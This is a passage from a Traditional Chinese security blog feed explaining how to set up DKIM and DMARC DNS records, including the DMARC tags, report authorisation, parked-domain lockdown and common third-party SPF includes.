class=\"language-txt\">//我們發布的<br>s1._domainkey.example.com CNAME s1.domainkey.uXXX.wlXXX.sendgrid.net<br><br>//sendgrid 發布的<br>s1.domainkey.uXXX.wlXXX.sendgrid.net TXT \"v=DKIM1; k=rsa;....\"</code></pre>\n<hr>\n<h2 id=\"dmarc\"><a class=\"direct-link\" href=\"#dmarc\">#</a> DMARC</h2>\n<p>以下皆建議採最嚴格的設置，若擔心使用 <code>p=reject</code> 會太過嚴苛造成困擾請至少使用 <code>p=quarantine</code>。</p>\n<p>以下範例請把 <code>rua</code> 跟 <code>ruf</code> 中的 <code>xx</code> 換成自己的信箱。可以在寄信網域中設定一個專門接收報告的信箱（例如 OneDegree 就創立了一個 <code>dmarc.reporting@onedegree.hk</code>），或是如果有使用第三方的 DMARC reporting 功能（例如 <a href=\"http://dmarcanalyzer.com\">dmarcanalyzer.com</a>）就換成他們提供的信箱。</p>\n<p>如果決定把報告寄到其他網域的話，務必注意收信人網域有沒有授權接收報告。根據 RFC 規範，收信人網域需要在 <code>&lt;dmarc domain&gt;._report._dmarc.&lt;reporting domain&gt;</code> 發一筆 DMARC 紀錄來授權報告寄送。假設 DMARC 紀錄網域：<a href=\"http://sender.com\">sender.com</a>，收報告地址為：report@thirdparty.com，則 <a href=\"http://thirdparty.com\">thirdparty.com</a> 要在 <code>sender.com._report._dmarc.thirdparty.com</code> 發一筆內容為 <code>v=DMARC1</code> 的 TXT 紀錄。這個機制的目的一來是為了防止有人故意用大量報告對第三方的收信人做垃圾信件攻擊（spamming），二來也是保護發行 DMARC 紀錄的網域不要讓過多資訊外流。</p>\n<p>豆知識：前面提到的 <a href=\"http://dmarcanalyzer.com\">dmarcanalyzer.com</a>，就是設定接收所有報告哦！<code>*._report._dmarc.rep.dmarcanalyzer.com TXT &quot;v=DMARC1;&quot;</code></p>\n<p>另外，如果你是第一次設定，建議 <code>p=reject</code> 先改成 <code>p=none</code> 防止信件突然都被擋掉。請確認每日的彙整報告結果符合預期，並搭配手動檢查原始信件看看不同收信 mail server 效果如何，等實驗了一陣子都沒問題，再逐漸改成更嚴格的 <code>p=quarantine</code> ，穩定後使用 <code>p=reject</code>。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%AF%A6%E9%A9%97%E4%B8%AD\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%AF%A6%E9%A9%97%E4%B8%AD\">#</a> 情境一：實驗中</h3>\n<p>如果你還在實驗階段，不希望所有的信都被擋下，可以用寬鬆一點的 policy 或是低一點的 percentage 讓部分信件通過驗證：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">// lax policy  <br>v=DMARC1 p=none rua=mailto:xx ruf=mailto:xx<br><br>// lower percentage of policy application  <br>v=DMARC1 p=quarantine pct=20 rua=mailto:xx ruf=mailto:xx</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E6%B2%92%E6%9C%89%E5%AD%90%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E6%B2%92%E6%9C%89%E5%AD%90%E7%B6%B2%E5%9F%9F\">#</a> 情境二：沒有子網域</h3>\n<p>如果寄信網域只有一個，或是沒有多個子網域共用 DMARC 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=DMARC1 p=reject aspf=s adkim=s rua=mailto:xx ruf=mailto:xx</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%AD%90%E7%B6%B2%E5%9F%9F%E5%85%B1%E7%94%A8-dmarc\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%AD%90%E7%B6%B2%E5%9F%9F%E5%85%B1%E7%94%A8-dmarc\">#</a> 情境三：子網域共用 DMARC</h3>\n<p>如果 DMARC 紀錄涵蓋多個子網域：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=DMARC1 p=reject rua=mailto:xx ruf=mailto:xx</code></pre>\n<p>如果你想為子網域設定寬鬆一點的 policy，也可以用 <code>sp</code></p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=DMARC1 p=reject sp=quarantine rua=mailto:xx ruf=mailto:xx</code></pre>\n<h3 id=\"%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84-2\"><a class=\"direct-link\" href=\"#%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84-2\">#</a> 發布紀錄</h3>\n<p>請在你的 DNS 裡以 TXT 類型發布到 <code>_dmarc.&lt;yourdomain&gt;</code> 這個網域，應該一樣幾分鐘就可以在 mxtoolbox 上查詢到了。如果有把報告寄到其他網域，也請確定有發布授權紀錄。</p>\n<h3 id=\"%E4%B8%8D%E5%AF%84%E4%BF%A1%E7%9A%84%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E4%B8%8D%E5%AF%84%E4%BF%A1%E7%9A%84%E7%B6%B2%E5%9F%9F\">#</a> 不寄信的網域</h3>\n<p>上面講了會寄信的網域該如何設置，那不寄信的網域怎麼辦呢？畢竟什麼都沒設置的話，駭客用這些子網域寄信就能躲過驗證啊！</p>\n<p>很簡單，明文禁止所有信件就好。如果有很多個不寄信的網域的話，也可以用 CNAME 的方式指到一筆紀錄，方便管理。</p>\n<pre class=\"language-txt\"><code class=\"language-txt\"># SPF<br>record: v=spf1 -all  <br>DNS: parked.mydom.com TXT \"v=spf1 -all\"<br><br># DKIM<br>record: v=DKIM1; p=  <br>DNS: \\*.\\_domainkey.parked.mydom.com TXT \"v=DKIM1; p=\"<br><br># DMARC<br>record: v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx  <br>## DNS for one parked domain:  <br>_dmarc.parked.mydom.com TXT \"v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx\"<br><br>## DNS for many parked domains:   <br>_dmarc.parked1.mydom.com CNAME _dmarc.parkeddoms.mydom.com  <br>_dmarc.parked2.mydom.com CNAME _dmarc.parkeddoms.mydom.com  <br>_dmarc.parked3.mydom.com CNAME _dmarc.parkeddoms.mydom.com  <br>_dmarc.parkeddoms.mydom.com TXT \"v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx\"</code></pre>\n<hr>\n<h3 id=\"resources\"><a class=\"direct-link\" href=\"#resources\">#</a> Resources</h3>\n<ul>\n<li><a href=\"https://dmarcly.com/blog/how-to-set-up-dmarc-dkim-and-spf-in-office-365-o365-the-complete-implementation-guide\">DMARCLY: Setting up SPF, DKIM, DMARC for Office365</a></li>\n<li><a href=\"https://dmarcly.com/blog/how-to-set-up-spf-and-dkim-for-amazon-ses\">DMARCLY: Setting up SPF, DKIM for Amazon SES</a></li>\n<li><a href=\"https://dmarcly.com/blog/spf-dkim-dmarc-set-up-guide-for-g-suite-gmail-for-business\">DMARCLY: Setting up SPF, DKIM, DMARC for Gsuite</a></li>\n</ul>\n<p><strong>SPF domains for common third party services:</strong></p>\n<table>\n<thead>\n<tr>\n<th>Service</th>\n<th>SPF</th>\n<th>Lookups</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Google</td>\n<td><code>_spf.google.com</code></td>\n<td>4</td>\n</tr>\n<tr>\n<td>Microsoft (Office 365)</td>\n<td><code>spf.protection.outlook.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Amazon SES</td>\n<td><code>amazonses.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>MailChimp</td>\n<td><code>servers.mcsv.net</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>SendGrid</td>\n<td><code>sendgrid.net</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>FreshDesk</td>\n<td><code>email.freshdesk.com</code></td>\n<td>7 (includes sendgrid)</td>\n</tr>\n<tr>\n<td>Mandrill</td>\n<td><code>spf.mandrillapp.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Mailgun</td>\n<td><code>mailgun.org</code></td>\n<td>3</td>\n</tr>\n<tr>\n<td>Mimecast</td>\n<td><code>_netblocks.mimecast.com</code></td>\n<td>6</td>\n</tr>\n<tr>\n<td>Postmark</td>\n<td><code>spf.mtasv.net</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>HelpScout</td>\n<td><code>helpscoutemail.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Qualtrics</td>\n<td><code>_spf.qualtrics.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>SparkPost</td>\n<td><code>sparkpostmail.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Zoho</td>\n<td><code>zoho.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Salesforce</td>\n<td><code>_spf.salesforce.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Zendesk</td>\n<td><code>mail.zendesk.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>ConstantContact</td>\n<td><code>spf.constantcontact.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Sendinblue</td>\n<td><code>sendinblue.com</code></td>\n<td>9 (includes google and zendesk)</td>\n</tr>\n<tr>\n<td>MailerLite</td>\n<td><code>_spf.mlsend.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Keap</td>\n<td><code>infusionmail.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Sendpulse</td>\n<td><code>mxsmtp.sendpulse.com</code></td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n",
      "date_published": "2021-07-16T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/",
      "title": "關於 email security 的大小事 — 設定篇 DKIM、DMARC",
      "content_html": "<!-- summary -->\n<p>接續著前一篇，我們來講講 DKIM 跟 DMARC 的設定。</p>\n<!-- summary -->\n<p>老話一句，這裡的『設定』並不是回答你『如何在 google 或是 Office365 設好這些紀錄』、『用 XX 服務結果信寄不到怎麼辦』，這種操作配置的教學文請參考官方文件，畢竟 email provider 千千百百家，各自可能有的問題更是難以彙整。</p>\n<p>我想告訴你的『設定』是 SPF、DMARC 的 DNS 紀錄本身有哪些標籤，以及設置這些選項時可能不小心踩到哪些地雷，導致收信方的 email server 在驗證你的郵件時出現非預期地報錯，而判斷驗證失敗。另外，也會告訴你如果有多個子網域，或有使用第三方寄信服務時該怎麼辦。</p>\n<p>總之，可以想成是回答你『我該怎麼理解這些紀錄』和『每個機制有哪些選項跟限制』，而不是針對單一 email provider 的教學文。</p>\n<p>有不懂或是想了解更多範例與延伸議題，請看本系列其他篇～<br>\n如果你還不太懂 SPF、DKIM、DMARC 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">關於 email security 的大小事 — 原理篇</a><br>\n如果你在找 SPF 的設定 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">關於 email security 的大小事 — 設定篇 SPF</a><br>\n如果你想搭配設定範例 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">關於 email security 的大小事 — 範例篇</a><br>\n如果你想了解延伸議題 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra\">關於 email security 的大小事 — 延伸篇</a></p>\n<hr>\n<h2 id=\"dkim\"><a class=\"direct-link\" href=\"#dkim\">#</a> DKIM</h2>\n<p>我們先從 DKIM 開始，因為對設置者來說，他是標籤彈性最小、可控選項最少的驗證機制，所以也不太容易出錯。</p>\n<p>回顧我們在原理篇看到的 DKIM signature，裡面有非常多欄位，包含版本、加密法、時間戳、網域等等。舉例來說，當收信方的 email server 看到下圖這個 DKIM signature，就會用裡面的 <code>s=brisbane,d=example.net</code> 組合出 DKIM 公鑰發行的網域：<code>brisbane._domainkey.example.net</code>，再用找到的公鑰解密 <code>bh</code>（body hash） 來比對雜湊（hash），進而驗證信件真實性。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dkim-signature.png\" /><figcaption><p>DKIM signature（取自 維基百科）</p>\n</figcaption></figure></p>\n<p>一般來說，你的 email provider 都會提供給你產生 DKIM 的工具，裡面的網域名稱、加密演算法等等都不能更改，可以配置的通常只有：</p>\n<ul>\n<li>金鑰長度：1024 或是 2048 位元。</li>\n<li>prefix selector：也就是欄位中的 <code>s</code>，會跟 <code>d</code> 一起用於 DNS 查詢，用來辨識不同的 DKIM 公鑰。這個值可以是任何字串，不過因為是用來組成發布 DKIM 紀錄的網域名，所以 <code>(s,d)</code> 必須是 unique 的。</li>\n</ul>\n<p>設定完成後就把公鑰發布在 <code>&lt;selector&gt;._domainkey.&lt;domain&gt;</code> 這個網域下，以 onedegree 為例，存在如下的一筆 DKIM 紀錄：</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-settings-dkimdmarc/onedegree-dkim.png\" /><figcaption><p>OneDegree DKIM</p>\n</figcaption></figure></p>\n<p>根據 RFC，DKIM signature 產生於 Administrative Management Domains (ADMDs)，在信件的 creation 與 relay 均可能發生，也就是說一封信件可能是經過多次簽名的，例如我們之前提過的轉發（forwarding）就會保留原始信件的簽章並且加上中繼 email server 自己的的簽章。當信件內有多個 DKIM signature，每一個都會被驗證，不過只需要其中一個同時符合 verification 跟 alignment，DMARC 就會判定為 pass。</p>\n<h3 id=\"%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\">#</a> 多個子網域</h3>\n<p>如果你有多個會寄信的網域，就要為每一個分別設置 DKIM，只要他們的 selector 不同即可。例如你設置了以下兩個網域：</p>\n<ul>\n<li><code>mydom.com</code>： <code>selector=happy, DNS at happy._domainkey.mydom.com</code></li>\n<li><code>sub.mydom.com</code>： <code>selector=sad, DNS at sad._domainkey.sub.mydom.com</code></li>\n</ul>\n<p>那麼不同網域簽署寄出去的信會用各自的私鑰，驗證時也會查詢到對應的公鑰，一切順利。</p>\n<h3 id=\"%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\">#</a> 第三方服務</h3>\n<p>如果你有使用第三方的寄件服務，例如 SendGrid，他們會為你創造一把 DKIM 公私鑰，用自己的網域（例如 <code>sendgrid.net</code>）發布公鑰，再給你一筆 CNAME 型別的 DKIM 紀錄：</p>\n<p><code>happy._domainkey.mydom.com CNAME s1.domainkey.uXXX.wlXXX.sendgrid.net</code></p>\n<p>這樣收信方要驗證你由 SendGrid 發出的信時，就會先查詢 <code>happy._domainkey.mydom.com</code>，然後被導到實際帶有公鑰的網域 <code>s1.domainkey.uXXX.wlXXX.sendgrid.net</code>。</p>\n<hr>\n<h2 id=\"dmarc\"><a class=\"direct-link\" href=\"#dmarc\">#</a> DMARC</h2>\n<p>最後是 DMARC 啦～ 跟 SPF 比起來，DMARC 雖然標籤也不少，但地雷少得多，而且寄送報告的功能也能方便我們 debug 驗證失敗的郵件到底是哪裡出了問題。</p>\n<p>原理篇提過，DMARC 是建立在 SPF 與 DKIM 之上的大一統防線，所以當然是要先設好 SPF 與 DKIM 囉！那如果今天沒有把這兩個都設定好，難道 DMARC 就一定會 fail 嗎？</p>\n<p>其實也不會，你只是無法享受到完整的保護而已。DMARC 只會以有設置的機制判斷，所以假設只有設 SPF，那 DMARC 就只會對 SPF 做驗證跟 alignment 檢查，DKIM 會被自動忽略，這封信雖然一樣會寄到使用者信箱，但就不保證信件內容的真實性了。</p>\n<p>DMARC 運作流程可以用下面這張 RFC 裡定義的 flowchart 表示，重點注意紅色框框的部分。點點（…）代表 DNS query，星星（***）代表有 data exchange，所以可以看到 DMARC 是先得到 SPF 與 DKIM 的結果，再跟 author domain 進行 DNS query 拿到 DMARC 紀錄，如果成功找到紀錄就配合 SPF 與 DKIM 的結果得出 DMARC 驗證的結論，最後把驗證結果交給 MDA 做信件的過濾。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-settings-dkimdmarc/flowchart.png\" /><figcaption><p>Flowchart from RFC</p>\n</figcaption></figure></p>\n<p>DMARC 驗證結果也會在原始信件裡留下紀錄。下圖紅框的地方分別是 SPF 與 DKIM 的驗證加上 alignment 檢查的結果，最後的 compauth 則是 DMARC 本身的驗證結果。因為 SPF 與 DKIM 都是 pass，所以 DMARC 也是 pass。</p>\n<p>另外，只要 SPF <strong>或</strong> DKIM 通過 alignment 檢查就可以，不用兩個都符合！</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-settings-dkimdmarc/dmarc-result.png\" /><figcaption><p>DMARC result</p>\n</figcaption></figure></p>\n<p>接下來進入設定的部分。</p>\n<p>首先請注意，DMARC 設置的網域跟 SPF 不同，</p>\n<blockquote>\n<p>如果你的網域是 <code>mydom.com</code>，那 DMARC 就是在 <code>_dmarc.mydom.com</code> 這個子網域下的一筆 TXT 紀錄，放在 <code>mydom.com</code> 是無效的！</p>\n</blockquote>\n<p>值得補充的一點是，做 DNS query 的時候，如果沒在當前的網域找到 DMARC 紀錄，就會往上一層去找 organizational domain 的 DMARC 紀錄。所以假設你是用某個子網域（<code>mailing.mydom.com</code>）寄信，那當 <code>_dmarc.mailing.mydom.com</code> 沒有 DMARC 紀錄時，就會去抓 <code>_dmarc.mydom.com</code> 的，不過這時用的 policy 就會是 subdomain policy（請看下面的 <code>sp</code> 標籤）。這個特性允許我們更方便地設置跟監控 DMARC，不用特別為每個子網域重新設定一筆紀錄。</p>\n<p>再來我們看看 DMARC 有哪些標籤吧！標籤與標籤值之間皆以一個等號（<code>=</code>）區隔，中間不可以有任何空白。如果在解析 DMARC 紀錄的時候發生語法錯誤，例如：錯字、不在定義內的未知標籤或標籤值、重複的標籤、大小寫錯誤等等，都會直接被忽略。也就是說，出錯的地方會被套用預設標籤值，而這個預設值通常是最寬鬆、保護效果最差的。</p>\n<p>以下依據用途簡單分類了標籤，除了開頭必須是 <code>v=DMARC1</code> 並緊接唯一的必要標籤 <code>p</code> 之外，其他標籤都是 optional ，且順序是沒有規定的。</p>\n<h3 id=\"%E6%94%BF%E7%AD%96%E7%9B%B8%E9%97%9C\"><a class=\"direct-link\" href=\"#%E6%94%BF%E7%AD%96%E7%9B%B8%E9%97%9C\">#</a> 政策相關</h3>\n<h5 id=\"p\"><a class=\"direct-link\" href=\"#p\">#</a> p</h5>\n<p>語法為： <code>p=action</code></p>\n<p>即 policy，也就是當 DMARC 驗證結果為 fail 時該採取的行動（action）。不過，這個 action 在 RFC 定義裡只是建議收信方遵照寄信方的意志而非強制（SHOULD … adhere ），實際的 action 仍由 MDA 決定。</p>\n<p>可能的標籤值為：</p>\n<ul>\n<li><code>reject</code>：指示於 SMTP 層做 rejection。可能是會回到 bounce address、回覆 SMTP client 一個 5XY error code（ex: 550）、或是回覆傳送成功但默默丟掉（discard）。</li>\n<li><code>quarantine</code>：指示收信方應將信件視為可疑（suspicious）。可能的處理方式包含：放到垃圾信件夾、集中到檢疫中心（quarantine center）等待管理員查看、送入信箱但加註某種標籤等等。</li>\n<li><code>none</code>：不指示任何 action。由收信方自由決定。</li>\n</ul>\n<p>在設置上建議採用最嚴格的 <code>reject</code>，不過實務上為避免設定有誤而導致信件突然都寄不到，造成營運上的影響，許多 email provider 會建議第一次設定 DMARC 時先用 <code>none</code>，觀察幾天的 DMARC report 以及信件原始內容的驗證結果，再逐漸調整成 <code>quarantine</code> 跟 <code>reject</code>。</p>\n<h5 id=\"sp\"><a class=\"direct-link\" href=\"#sp\">#</a> sp</h5>\n<p>語法為： <code>sp=action</code></p>\n<p>即 subdomain policy，概念與語法皆同上面的 <code>p</code>。使用場景如前面說過的，用子網域 <code>mailing.mydom.com</code> 寄信，但 <code>_dmarc.mailing.mydom.com</code> 沒有 DMARC 紀錄，這時會採用最上層 <code>_dmarc.mydom.com</code> 的紀錄（如果存在），且採用 subdomain policy 定義的 action。</p>\n<p>如果沒有定義 <code>sp</code>，預設會跟 <code>p</code> 一樣。</p>\n<h5 id=\"pct\"><a class=\"direct-link\" href=\"#pct\">#</a> pct</h5>\n<p>語法為： <code>pct=num</code></p>\n<p>即 percentage，就是要套用此 policy 的比例，概念上類似隨機 dropout 讓一部分的信件就算驗證結果是 fail 還是直接算他通過。因為 DMARC 可能導致信件突然都寄不到，所以為了不要讓這種 all-or-nothing 的特性導致大家不敢使用 DMARC，延伸出這種部分套用的機制，可以讓寄信方先實驗看看。不管信件是否因為 <code>pct</code> 機制而被保留，所有驗證 fail 的信件都會出現在彙整報告，方便寄信方 debug。</p>\n<p>如果一封信因為 <code>pct</code> 機制而被保留，採取的 action 因 policy 而異，基本上是放寬一個等級。例如本來要 <code>quarantine</code> 的就變成 <code>none</code>，本來該 <code>reject</code> 的就變成 <code>quarantine</code>。</p>\n<p><code>num</code> 介於 0 到 100 之間，預設是 100，也就是全部套用。</p>\n<h3 id=\"alignment-%E7%9B%B8%E9%97%9C\"><a class=\"direct-link\" href=\"#alignment-%E7%9B%B8%E9%97%9C\">#</a> alignment 相關</h3>\n<h5 id=\"aspf\"><a class=\"direct-link\" href=\"#aspf\">#</a> aspf</h5>\n<p>語法為： <code>aspf=mode</code></p>\n<p>代表 alignment SPF，也就是在進行 SPF 的 alignment 檢查時採取的方式，預設為 <code>r</code>。</p>\n<p>可能的標籤值為：</p>\n<ul>\n<li><code>r</code> (relaxed)：寬鬆的比對，<code>smtp.MailFrom</code> 與 <code>header.From</code> 只要 organizational domain 相同即可（同一個根網域）。</li>\n<li><code>s</code> (strict)：嚴格的比對，<code>smtp.MailFrom</code> 與 <code>header.From</code> 需完全相同。</li>\n</ul>\n<h5 id=\"adkim\"><a class=\"direct-link\" href=\"#adkim\">#</a> adkim</h5>\n<p>語法為：<code>adkim=mode</code></p>\n<p>代表 alignment DKIM，也就是在進行 DKIM 的 alignment 檢查時採取的方式，預設為 <code>r</code>。</p>\n<p>可能的標籤值為：</p>\n<ul>\n<li><code>r</code> (relaxed)：寬鬆的比對，DKIM signature 的 <code>d=</code> 與 <code>header.From</code> 只要 organizational domain 相同即可（同一個根網域）。</li>\n<li><code>s</code> (strict)：嚴格的比對，DKIM signature 的 <code>d=</code> 與 <code>header.From</code> 需完全相同。</li>\n</ul>\n<h3 id=\"%E5%A0%B1%E5%91%8A%E7%9B%B8%E9%97%9C\"><a class=\"direct-link\" href=\"#%E5%A0%B1%E5%91%8A%E7%9B%B8%E9%97%9C\">#</a> 報告相關</h3>\n<h5 id=\"rua\"><a class=\"direct-link\" href=\"#rua\">#</a> rua</h5>\n<p>語法為：<code>rua=addr1,addr2,addr3…</code></p>\n<p>指示彙整報告（aggregate report）要寄送的位置，值為一串由逗號（<code>,</code>）分隔的 DMARC URI。RFC 定義 DMARC URI 為 <code>mailto:emailaddress</code>，例如 <code>mailto:woohoo@gmail.com</code>，如果指定了不合法的郵件位置會被忽略。</p>\n<p>不合法的 DMARC URI 地雷：</p>\n<ul>\n<li>收信人網域沒有 MX 紀錄：例如指定 <a href=\"mailto:abc@no-mx.com\">abc@no-mx.com</a>，因為 <a href=\"http://no-mx.com\">no-mx.com</a> 沒有 MX 紀錄，所以此信無法寄送。</li>\n<li>收信地址中有逗號（<code>,</code>）或是驚嘆號（<code>!</code>）：會造成解析上錯誤而被忽略。如必要請記得做 escaping 或 quoting。</li>\n<li>收信人網域沒有授權接收報告：如果收信人網域跟 DMARC 紀錄網域相同不會有這個問題，不過如果今天指定報告要寄送其他網域，則指定收信人網域需要在 <code>&lt;dmarc domain&gt;._report._dmarc.&lt;reporting domain&gt;</code> 發一筆 DMARC 紀錄來授權報告寄送。假設 DMARC 紀錄網域：<a href=\"http://sender.com\">sender.com</a>，收報告地址為：report@thirdparty.com，則 <a href=\"http://thirdparty.com\">thirdparty.com</a> 要在 <code>sender.com._report._dmarc.thirdparty.com</code> 發一筆內容為 <code>v=DMARC1</code> 的 TXT 紀錄。這個機制的目的一來是為了防止有人故意用大量報告對第三方的收信人做垃圾信件攻擊（spamming），二來也是保護發行 DMARC 紀錄的網域不要讓過多資訊外流。豆知識：有些提供 DMARC reporting 的第三方服務（例如 <a href=\"http://dmarcanalyzer.com\">dmarcanalyzer.com</a>），就會設定 <code>*._report._dmarc.rep.dmarcanalyzer.com TXT &quot;v=DMARC1;&quot;</code> 允許接收所有報告哦！</li>\n</ul>\n<p>彙整報告包含所有信件的 DMARC 驗證情況，不論成功還是失敗都會紀錄，內容包含採用的 DMARC 紀錄、SPF 與 DKIM 的結果、alignment 細節、最後的 policy 與實際執行的 action、還有驗證結果的統計數字等等。</p>\n<h5 id=\"ruf\"><a class=\"direct-link\" href=\"#ruf\">#</a> ruf</h5>\n<p>語法為：<code>ruf=addr1,addr2,addr3…</code></p>\n<p>指示失敗報告（failure report）要寄送的位置，值為一串由逗號（<code>,</code>）分隔的 DMARC URI。語法與地雷皆同上。</p>\n<p>失敗報告與彙整報告不同在於：</p>\n<ul>\n<li>彙整報告是每日（或是其他指定的區間）寄送一份，但失敗報告是在 DMARC 驗證失敗時馬上通知。</li>\n<li>失敗報告包含更詳細的資訊，例如原信件內容。</li>\n<li>失敗報告用於鑑識，觸發條件可以用下面的 <code>fo</code> 更細微控制。</li>\n</ul>\n<h5 id=\"fo\"><a class=\"direct-link\" href=\"#fo\">#</a> fo</h5>\n<p>語法為：<code>fo=0:1:d:s</code></p>\n<p>用來指示失敗報告的觸發機制，值為一串由冒號（<code>:</code>）分隔的標籤值（多選），預設為 <code>0</code>。若 DMARC 紀錄中沒有 <code>ruf</code>，<code>fo</code> 會被忽略。</p>\n<p>標籤值為：</p>\n<ul>\n<li><code>0</code>：如果沒有任何一種驗證得出 pass，也就是當 SPF、DKIM、alignment 通通都失敗的時候。</li>\n<li><code>1</code>：如果有任何一種驗證<strong>沒有</strong>得出 pass，也就是當 SPF、DKIM、alignment 有至少其中一種失敗的時候。</li>\n<li><code>d</code>：如果 DKIM 驗證失敗（不管 alignment）就觸發。</li>\n<li><code>s</code>：如果 SPF 驗證失敗（不管 alignment）就觸發。</li>\n</ul>\n<h5 id=\"rf\"><a class=\"direct-link\" href=\"#rf\">#</a> rf</h5>\n<p>語法為： <code>rf=afrf</code></p>\n<p>定義失敗報告的格式，目前只有 <code>afrf</code> 一種，同樣是預設值。</p>\n<h5 id=\"ri\"><a class=\"direct-link\" href=\"#ri\">#</a> ri</h5>\n<p>語法為： <code>ri=sec</code></p>\n<p>收到彙整報告的區間，單位為秒，預設是 86400，也就是一天。你也可以設定每幾小時接收報告，不過為了避免造成收信方太大負擔，小於一天的報告區間採 best effort 寄送（白話文：我盡量啦）。</p>\n<h3 id=\"%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F-2\"><a class=\"direct-link\" href=\"#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F-2\">#</a> 多個子網域</h3>\n<p>如果你有多個會寄信的網域，其實不需要為他們分別設置 DMARC 紀錄。我們上面提過的 <code>sp</code> 標籤就是為了讓你可以在根網域的 DMARC 紀錄指示子網域的 policy。</p>\n<h3 id=\"%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99-2\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99-2\">#</a> 第三方服務</h3>\n<p>如果你在 SPF 跟 DKIM 有設好，第三方服務對 DMARC 的影響會在 alignment 的部分。我們說過， <code>smtp.MailFrom</code> 跟 <code>header.From</code> 可以不同，所以如果你透過 Sendgrid 等服務寄信，SPF 驗證會通過但是 alignment 就會失敗。不過好在 alignment 檢查只要 SPF 或 DKIM 通過就行了，所以回到前面介紹 DKIM 與第三方服務的部分，這裡用的是我們自己的 <code>d=</code> 網域，所以 alignment 就沒問題了。</p>\n<p>另一種會出事的場景是轉發（forwarding），也就是有一個中繼 email server 要在不影響 authentication 的情況下傳遞原汁原味的信件。因為多了一個中間人，所以 SPF 會驗證失敗，而 DKIM 雖然會驗證成功，但在 alignment 檢查又會被擋下。這種多 hop 傳遞的情況在現實世界中是很常見的，但是 DMARC 的機制會使這些信件驗證失敗，因此延伸出了我們下一篇會再來聊聊的 ARC （Authentication Recieved Chain）機制。</p>\n<hr>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>終於整理完繁瑣的各種細節了（撒花！）這兩篇基本上把 RFC 定義翻譯了一遍，不過因為這些機制都還不算太成熟，所以設定未來都還是可能變動的。</p>\n<p>我自己在設定這些的時候是配合著原始信件內容跟彙整報告檢視三劍客的有效性跟正確性，建議大家可以測試的時候可以多寄到幾個不同的信箱（例如 gmail、outlook、hotmail、yahoo …）看看 action 的不同。如果要偽冒寄信的話可以用線上的 Emkei’s Fake Mailer 來檢視信件是否真的有被擋下來。</p>\n<p>不過，即使是驗證全都 pass 的信件還是有可能進垃圾信或是被擋下的喔！因為 DMARC 只是 MDA 參考的其中一個 filter，其他因素，例如內容重複性太高或是有奇怪連結、圖片、檔案等等也是會導致信件被過濾的。畢竟可是有很多 email security 廠商在努力幫大家擋掉釣魚跟垃圾信呢 XDDD</p>\n<p>關於 SPF、DKIM、DMARC 的原理與設置大致就到這，下一篇我們會來探討這些機制的不足、延伸的問題、和更多 email security 的小知識！</p>\n<h3 id=\"reference%3A\"><a class=\"direct-link\" href=\"#reference%3A\">#</a> Reference:</h3>\n<ol>\n<li><a 